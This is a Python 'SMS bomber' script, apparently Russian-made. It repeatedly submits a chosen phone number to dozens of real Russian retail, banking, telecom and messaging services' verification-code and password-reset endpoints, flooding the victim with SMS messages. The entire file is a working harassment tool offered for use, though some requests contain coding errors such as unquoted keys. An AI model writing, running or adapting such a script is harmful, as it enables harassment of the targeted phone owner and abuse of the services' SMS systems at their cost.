import requests, time, os

def logo():
	os.system('clear')
	x = '''
	┏━━━┓
	┃┏━┓┃
	┃┗━━┳━━┳━━┳┓┏┳━━┳━┓
	┗━━┓┃┏┓┃┏┓┃┗┛┃┃━┫┏┛
	┃┗━┛┃┗┛┃┏┓┃┃┃┃┃━┫┃
	┗━━━┫┏━┻┛┗┻┻┻┻━━┻┛
	╋╋╋╋┃┃ by https://vk.com/alexyyyyi
	╋╋╋╋┗┛
	'''
	print(x)

def bomber(nomer, krug, k):
	headers = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36'
	}
	phone = nomer
	krug = krug
	k = k
	pulse = '+' + phone
	no7 = phone[1:]
	masska1 =  '+7+(' + phone[1:4] + ')+' + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]
	masska2 = phone[1:4] + '+' + phone[4:7] + '+' + phone[7:9] + '-' + phone[9:11]
	masska3 = phone[1:4] + '+' + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]
	masska4 = '+7 (' + phone[1:4] + ') ' + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]	
	#+79602705551
	#9602705551
	#+7+(960)+270-55-51
	#960+270+55-51
	#960+270-55-51
	#+7 (960) 270-55-51
	print('Spam запущен ')
	for spama in range(int(krug)):		
		try:requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/", headers=headers, timeout=5.05)
		except:pass
		try:requests.post("https://lenta.com/api/v1/registration/requestValidationCode", 
						json={"phone" : "+" + phone}, headers=headers, timeout=5.05)
		except:pass
		try:requests.post("https://taxi.yandex.ru/3.0/auth",
							json={"id": "fa137685fd594a9f86f529eec9543e96", "phone": phone}, headers=headers, timeout=5.05)
		except:pass
		try:requests.post("https://youla.ru/web-api/auth/request_code",
							json={"phone": phone}, headers=headers, timeout=5.05)
		except:pass

		try:requests.post("https://eda.yandex.ru/api/v1/user/request_authentication_code",
							json={"phone_number": phone}, headers=headers, timeout=5.05)
		except:pass
		
		try:requests.post("https://my.modulbank.ru/api/v2/auth/phone",
							json={"CellPhone": phone[1:]}, headers=headers, timeout=5.05)

		except:pass
		try:requests.post("https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",
							data={"phone": "+" + phone}, headers=headers, timeout=5.05)
		except:pass
		
		try:requests.post("https://ng-api.webbankir.com/user/v2/create",
							json={"lastName": "Алексей", "firstName": "Смирнов", "middleName": "Алексейй",
								"mobilePhone": phone, "email": "asadsd@mail.ru", "smsCode": ""}, headers=headers, timeout=5.05)

		except:pass
					
		try:requests.post("https://my.telegram.org/auth/send_password",
							data={"phone": "+" + phone}, headers=headers, timeout=5.05)
		except:pass
		
		try:requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
						params={'msisdn': phone}, headers=headers, timeout=5.05)
		except:pass

		try:requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, headers=headers, timeout=5.05)
		except:pass
		
		try:requests.post("https://apteka.magnit.ru/api/personal/auth/code/", 
					data={'phone': phone}, headers=headers, timeout=5.05)
		except:pass

		try:requests.post("https://loymax.ivoin.ru/publicapi/api/ResetPassword/Start", 
					json={notifierIdentity: phone}, headers=headers , timeout=5.05)
		except:pass

		try:requests.post("https://ok.ru/dk?cmd=AnonymRecoveryStartPhoneLink&st.cmd=anonymRecoveryStartPhoneLink",
					data={st.r.phone: pulse}, headers=headers, timeout=5.05)
		except:pass

		try:requests.post("https://apteka-ot-sklada.ru/api/auth/requestBySms",
					json={phone: phone}, headers=headers, timeout=5.05)
		except:pass

		try:requests.post("https://re-store.ru/local/components/multisite/system.auth.sms/ajax.php",
					json={
						"action": "code_sms",
						"PERSONAL_PHONE": masska1,
						"PERSONAL_EMAIL": ""
					}, headers=headers, timeout=5.05)
		except:pass

		try:requests.post("https://zharpizza.ru/login",
					json={phone: masska2}, headers=headers, timeout=5.05)
		except:pass
		
		try:requests.post("https://www.gloria-jeans.ru/phone-verification/send-code/registration",
					json={phoneNumber: pulse}, headers=headers, timeout=5.05)
		except:pass
		
		try:requests.options('https://i.api.kari.com/ecommerce/client/registration/verify/phone/code?phone=' + pulse, headers=headers, timeout=5.05)
		except:requests.options('https://i.api.kari.com/ecommerce/client/registration/verify/phone/code?phone=' + pulse, headers=headers, timeout=5.05)

		try:requests.post("https://bizonpizza.ru/api/auth/send-sms-verification-code",
					json={phoneNumber: pulse}, headers=headers, timeout=5.05)
		except:pass

		try:requests.post("https://login.mts.ru/amserver/UI/Login?service=login&srcsvc=sitemts&goto=https://moskva.mts.ru/json/auth/publicuser/afterlogin",
					json= {
						"login": masska3,
						"IDToken1": no7,
						"IDButton": "Submit",
						"encoded": "false",
						"loginURL": "?service=sitemts&goto=https%3A%2F%2Fmoskva.mts.ru%2Fjson%2Fauth%2Fpublicuser%2Fafterlogin",
						"csrf.sign": "fee386083ef6b2ded9d9e2abebe2445ffee6750a32f501987d864a6b6aa619a7058e7f2ea0bfd3f3c0fafa9e34c0401071e07dfd620e9e7eeb8302205abe6ae4",
						"csrf.ts": "1630205683640"	
					}, headers=headers, timeout=5.05)
		except:pass
		
		
		try:requests.post("https://cnt-odcv-itv02.svc.iptv.rt.ru/api/v2/portal/send_sms_code",
					json={
						"action": "register",
						"phone": phone
					}, headers=headers, timeout=5.05)
		except:pass		
		
		
		try:requests.post("https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",
						data={"phone": pulse}, headers=headers, timeout=5.05)
		except:pass
		
		
		try:requests.post('https://www.etm.ru/cat/runprog.html',
						data={'m_phone': no7, 
							'mode': 'sendSms', 
							'syf_prog': 'clients-services', 
							'getSysParam': 'yes'}, headers=headers, timeout=5.05)

		except:pass
		
		
		
		try:requests.post("https://smotrim.ru/login",
					data={phone: phone}, headers=headers, timeout=3)
		except:pass		
		
		

		try:requests.post("https://nn-card.ru/api/1.0/restore-password",
					json={
						"password": "1234passsword",
						"phone": phone,
						"token": "03AGdBq24Reu7rlNKChsDo0c0XQsAZ1Xp-8_8bOjjMh768IdmDm_kMEUJSTrH8qThSZlCZJtdii0xp7P022na6RKUmYOKQkTHhaCz1DzWKYGypjJYPRWQWSy5i1EAUH1k3txkuD3ZPSKPqzxmZHzjXww1bDLkUAJhs5mdbMutBeo1nffWYkx6m-5f4HdC66MVGsHg80BgQuU2HU4jz9meCMv0Ns2oD-frfsUfLFFmNQnoYNj5qOFBibIKOsIWVMBU2GWK6Y_MJ8Nbq1wEldLX3D5LvzFGIyFCBpvgzOa9P_0SCmV2To01rxdn9Kpii5PLChTTIsX97_hZo3CK5FSsaujVIaFqh_vojnyyb5c1tjg3lJpS8xESjbhjJC4mmaBbgYeT-ZduuGr41KvInnOs2GsVGxJ2B4wKPsA"
					}, headers=headers, timeout=3)
		except:pass

		try:requests.post("https://cyberhero.tele2.ru/api/user/phone/send", json={"number": phone}, headers=headers, timeout=5.05)
		except:pass
		
		try:requests.get("https://findclone.ru/register", params={"phone": pulse}, headers=headers, timeout=5.05)
		except:pass
		
		try:requests.post("https://api.fix-price.com/buyer/v2/registration/phone/request", data={"phone": phone}, headers=headers, timeout=5.05)
		except:pass

		try:requests.post("https://www.petshop.ru/ajax/?act=AuthForm.SendCode",
					json={
						"force": false,
						"is_ajax": true,
						"phone": phone,
						"token": "e58713bdd4d43c07c3dfbab91e9b33bb"
					}, headers=headers, timeout=3)
		except:pass
		
		try:requests.post("https://www.perekrestok.ru/api/customer/1.4.1.0/user/sign-in",
					json={
						"isAdvertAgreed": true,
						"phone": phone
					}, headers=headers, timeout=3)
		except:pass


		try:requests.post("https://api-omni.x5.ru/api/v1/clients-portal/auth/send-sms-code",
					json={
						phoneNumber: pulse
					}, headers=headers, timeout=3)
		except:pass

		try:requests.get("https://www.askona.ru/api/registration/sendcode?csrf_token=6171d1d63a0df0e38ec9949eff5e38e5&contact[phone]=" + phone, headers=headers, timeout=3)
		except:pass
	

		try:requests.post("https://www.technopark.ru/graphql/",
					json={
						"operationName": "AuthStepOne",
						"query": "mutation AuthStepOne($phone: String!, $token: String!, $cityId: ID!) @access(token: $token) @city(id: $cityId) {\n  sendOTP(phone: $phone)\n}\n",
						"variables": {
							"cityId": "36966",
							"phone": no7,
							"token": "e8jrmrub8mtu1dqr717f1m1m11"
						}
					}, headers=headers, timeout=3)
		except:pass

		try:requests.post("https://ilovesakura.ru/phone/val1date",
					json={
						"phone": masska4
					}, headers=headers, timeout=3)
		except:pass
		k += 1
		ch = k
		print(str(ch) + ' круг пройден')

logo()
k = 0
phone = input('Введите номер с 7\n==> ')# сюда номер c 7
krug = input('Введите кол.во кругов\n==> ')
bomber(phone, krug, k)



